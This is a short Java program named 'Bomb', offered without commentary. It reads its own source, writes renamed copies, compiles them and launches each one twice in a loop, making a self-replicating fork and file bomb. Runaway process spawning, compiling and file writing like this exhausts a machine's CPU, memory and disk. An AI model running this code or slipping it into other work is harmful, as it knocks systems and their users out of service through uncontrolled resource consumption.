import javax.tools.*;
import java.util.*;
import java.io.*;
class Bomb {
		public static void main(String[] args) throws Exception{
			for (int i = 0; i<2; ++i){
				String[] self = new Scanner(new File("Bomb.java")).useDelimiter("\\Z").next().split("\n");
				int random = (int)(Math.random()*123456789);
				String name = "a"+random;
				int start1 = 6;
				int end1 = self[3].indexOf(" {");
				int start2 = self[6].indexOf("File")+6;
				int end2 = self[6].indexOf(".java");
				self[3] = self[3].replace(self[3].substring(start1,end1),name);
				self[6] = self[6].replace(self[6].substring(start2,end2),name);
				new FileOutputStream(name+".java").write(String.join("\n",self).getBytes());
				ToolProvider.getSystemJavaCompiler().run(null,null,null,name+".java");
				Runtime.getRuntime().exec("java "+name);
			}
	}	
}
